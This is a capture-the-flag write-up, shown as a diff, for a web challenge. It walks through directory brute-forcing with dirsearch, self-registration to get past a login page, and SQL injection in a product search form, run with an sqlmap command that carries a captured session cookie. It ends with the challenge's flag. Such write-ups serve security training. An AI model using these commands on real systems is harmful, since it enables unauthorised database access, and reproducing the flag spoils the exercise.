@@ -1,0 +1,46 @@
+1. When we go onto website we see a login form
+I downloaded dirsearch using git clone and made it executable.
+git clone https://github.com/maurosoria/dirsearch.git
+cd dirsearch
+chmod +x dirsearch.py
+
+2. Then i ran dirsearch against target url
+python3 dirsearch.py -u 34.179.142.63:30167 -e php,html,txt,js -x 404
+-u - target url
+-e extensions to check
+-x exclude status codes (404)
+
+3. I was looking for any hidden endpoints, directories, 
+or files that weren't immediately visible on the website. I found register.php specificall. The login page was the only visible entry point,
+and discovering a registration endpoint meant I could create our own account 
+to bypass the need for valid credentials and gain authenticated access to the application.
+
+4. I went on 
+http://34.179.142.63:32582/register.php and registered, then logged in
+
+5. In search bar i wrote "%" to list everything
+The % character is a wildcard in SQL LIKE queries. The application is using a query like:
+SELECT * FROM products WHERE product_name LIKE '%<input>%'
+This indicates the search parameter is being directly inserted into a SQL query without sanitization which is SQL Injection vulnerability confirmed!
+
+6. Next install SQLmap
+sudo apt install sqlmap
+
+7. Take cookie out of burp suite and 
+
+modify (cookie="PHPSESSID=YOUR ACTUAL COOKIES") and -u "PASTE UR ACTUAL URL"
+
+sqlmap --cookie="PHPSESSID=064014a23798f2f91e5dea77e8a8e45f" \
+       -u "http://34.179.142.63:30167/index.php" \
+       --data="product_name=test&submit=Search" \
+       --columns \
+       --random-agent \
+       --batch
+
+So I decided to use Burp Suite because I needed to intercept the HTTP request to see exactly how the search form was submitting data, 
+and I was specifically looking for the POST request containing my session cookie and the product_name parameter.
+I fed those into SQLmap and targeted the vulnerable search endpoint.
+
+8. Once it's ran, you can see tables. One of them is named Table: CTF{1nformat1on_sch3ma_c4n_.
+We can reconstruct it with the rest of the table. CTF{1nformat1on_sch3ma_c4n_ + cont41n + _ + us3ful + _d4t4}
+So the CTF is CTF{1nformat1on_sch3ma_c4n_cont41n_us3ful_d4t4}
